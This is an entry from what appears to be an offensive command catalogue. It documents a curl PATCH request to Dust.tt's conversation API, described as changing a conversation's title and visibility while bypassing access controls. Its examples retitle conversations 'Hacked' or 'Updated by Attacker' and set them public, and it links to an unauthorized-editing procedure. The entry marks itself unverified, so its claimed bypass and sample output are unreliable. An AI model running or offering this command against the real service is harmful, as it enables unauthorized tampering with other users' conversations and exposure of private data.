---
id: cmd-curl-dust-edit-001
data: >-
  curl -X PATCH
  "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H
  "Authorization: Bearer YOUR_SESSION_TOKEN" -H "Content-Type: application/json"
  -d '{"title":"Updated by Attacker","visibility":"unlisted"}'
tags:
  - api
  - patch
  - dust-tt
type: command
output: >-
  {"conversation": {"id": 123, "sId": "conv_abc123", "title": "Updated by
  Attacker", "visibility": "unlisted", ... }}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:26.876Z'
verified: false
validated: true
submitted: true
---
# curl-dust-edit-conversation

## Command

```bash
curl -X PATCH "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H "Authorization: Bearer YOUR_SESSION_TOKEN" -H "Content-Type: application/json" -d '{"title":"Updated by Attacker","visibility":"unlisted"}'
```

## Description

Patches updates to a Dust.tt conversation's metadata, bypassing access controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PATCH` | HTTP method | Yes |
| `URL` | Endpoint path | Yes |
| `-H "Authorization: ..."` | Auth token | Yes |
| `-H "Content-Type: ..."` | JSON header | Yes |
| `-d 'JSON'` | Payload with fields like title, visibility | Yes |

## Examples

### Basic Usage

```bash
curl -X PATCH "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"title":"Hacked","visibility":"public"}'
```

### Advanced Usage

Include more fields if supported:

```bash
curl -X PATCH "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"title":"Updated","visibility":"unlisted","someOtherField":"value"}'
```

## Expected Output

JSON with updated conversation object (HTTP 200).

## Related

- [[commands/curl-dust-read-conversation]]
- [[procedures/Edit-Unauthorized-Conversation]]
